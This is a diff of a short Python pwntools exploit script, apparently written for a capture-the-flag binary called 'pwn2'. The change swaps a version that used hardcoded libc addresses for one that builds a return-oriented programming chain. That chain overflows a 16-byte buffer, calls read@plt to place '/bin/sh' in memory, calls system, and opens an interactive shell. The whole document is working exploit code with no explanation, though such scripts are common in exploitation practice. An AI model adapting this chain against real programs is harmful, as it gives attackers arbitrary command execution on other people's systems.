@@ -1,12 +1,28 @@
 from pwn import *
-#p = remote('10.140.0.8', 11112)
-p = process('./pwn2')
-offset = 'a' * 16
-target_addr = 0x04005f7
-prr = p64(0x00000000004006d3)
-binsh = p64(0x7ffff7b99d57)
-system = p64(0x7ffff7a52390)
 
-payload = offset + prr + binsh + system
-p.sendline(payload)
-p.interactive()
+r = process("./pwn2")
+elf = ELF('./pwn2')
+context(arch='amd64')
+
+offset = 'a'*16
+pop_rsi_r15_ret = 0x4006d1
+pop_rdi_ret = 0x4006d3
+
+buf = 0x601100
+print 'read@plt', hex(elf.plt['read'])
+print 'system@plt', hex(elf.plt['system'])
+payload = flat([
+                offset,
+                pop_rdi_ret,
+                0,
+                pop_rsi_r15_ret,
+                buf,
+                'a' * 8,
+                elf.plt['read'],
+                pop_rdi_ret,
+                buf,
+                elf.plt['system']
+                ])
+r.sendline(payload)
+r.sendline("/bin/sh")
+r.interactive()
